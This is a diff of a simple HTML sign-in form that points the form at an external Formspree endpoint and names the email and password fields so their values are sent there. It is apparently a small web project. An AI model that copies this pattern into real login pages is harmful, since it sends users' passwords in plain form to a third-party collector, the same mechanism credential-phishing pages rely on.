@@ -15,7 +15,7 @@
   </head>
   <body>
     <main>
-      <form action="">
+      <form action="https://formspree.io/f/xovajgqe" method="POST">
         <label for="">Please sign in</label>
         <input
           class="email"
@@ -25,6 +25,7 @@
           required
           minlength="3"
           maxlength="40"
+          name="email"
         />
         <input
           class="password"
@@ -32,9 +33,10 @@
           placeholder="Password"
           required
           minlength="3"
+          name="password"
         />
         <div class="remCheck">
-          <input class="checkbox" type="checkbox" name="" id="" />
+          <input class="checkbox" type="checkbox" name="cb" id="" />
           <label class="rememberMe" for="">Remember me</label>
         </div>
         <button type="submit">Sign in</button>
